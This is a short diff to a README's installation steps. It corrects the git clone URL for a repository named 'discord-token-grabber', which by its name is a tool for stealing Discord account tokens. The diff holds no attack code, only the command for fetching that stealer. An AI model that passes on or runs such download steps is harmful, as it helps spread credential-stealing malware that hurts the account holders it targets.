@@ -15,7 +15,7 @@
 
 1. Download source
 ```bash
-git clone https://github.com/TheMaestr1s/discord-token-grabber
+git clone https://github.com/TheMaestro1s/discord-token-grabber.git
 cd discord-token-grabber
 ```
 
